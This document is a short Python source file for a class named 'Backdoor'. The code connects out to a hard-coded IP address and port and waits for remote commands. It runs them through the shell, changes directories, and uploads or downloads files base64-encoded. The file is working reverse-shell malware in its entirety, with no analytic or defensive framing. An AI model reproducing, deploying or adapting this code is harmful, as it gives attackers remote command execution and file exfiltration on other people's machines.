import os
import socket
import subprocess
import json
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def executeCommand(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True)
        except subprocess.CalledProcessError:
            return b"[+] error in executing this command"

    def reliableSend(self, data):
        ndata = data.decode('UTF-8')
        jsonData = json.dumps(ndata)
        jsonData = jsonData.encode('UTF-8')
        self.connection.send(jsonData)

    def changeWorkingDirectory(self, path):
        os.chdir(path)
        res = "[+] Changing Working Directory to " + path
        res = res.encode('UTF-8')
        return res

    def reliableReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.connection.recv(1024).decode('UTF-8')
                # njData = jsonData.decode('UTF-8')
                return json.loads(jsonData)
            except ValueError:
                continue

    def readFile(self, path):
        try:
            with open(path, "rb") as f:
                return base64.b64encode(f.read())
        except Exception:
            return b'[+] File not found'

    def writeFile(self, path, content):
        with open(path, 'wb') as f:
            #content = content.decode('UTF-8')
            f.write(base64.b64decode(content))
            return b"[+] Upload Successful"

    def run(self):
        while True:
            try:
                cmd = self.reliableReceive()
                print(cmd)
                cmd = cmd.split(' ')
                if cmd[0] == 'exit':
                    self.connection.close()
                    exit()
                elif cmd[0] == 'cd' and len(cmd) > 1:
                    cmdRes = self.changeWorkingDirectory(cmd[1])
                elif cmd[0] == 'download':
                    cmdRes = self.readFile(cmd[1])
                elif cmd[0] == 'upload':
                    cmdRes = self.writeFile(cmd[1], cmd[2])
                else:
                    #filerCmd = cmd.decode('UTF-8')
                    #cmdRes = self.executeCommand(filerCmd)
                    cmdRes = self.executeCommand(cmd)
            except Exception:
                cmdRes = b"[+] Some error occurred in executing this command in backdoor"
            print(cmdRes)
            self.reliableSend(cmdRes)

obj = Backdoor("192.168.1.88", 4444)
obj.run()
